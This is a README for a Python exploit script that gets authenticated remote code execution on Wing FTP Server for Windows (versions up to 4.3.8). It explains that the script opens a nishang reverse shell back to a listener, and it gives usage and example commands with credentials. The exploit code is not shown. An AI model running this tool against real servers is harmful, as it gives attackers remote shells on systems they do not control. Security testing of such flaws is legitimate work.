# Wing FTP RCE - Authenticated
This is an exploit written in Python3 for the Wing FTP Server running on Windows. This exploit requires Wing FTP's admin panel authentication.

## Tested versions
<=4.3.8

## About the vulnerability
This exploit was discovered by Alex Haynes.

## How to run:
This exploit will invoke a nishang tcp reverse shell on the target. Start your listener before executing.

#Usage:
```
wingrce.py <TARGET> <TARGET_PORT> <LOCAL_IP> <LOCAL_PORT> <USER> <PASSWORD>
```
#Example:
```
wingrce.py 0.0.0.0 8000 127.0.0.1 9001 notcos coolpass
```
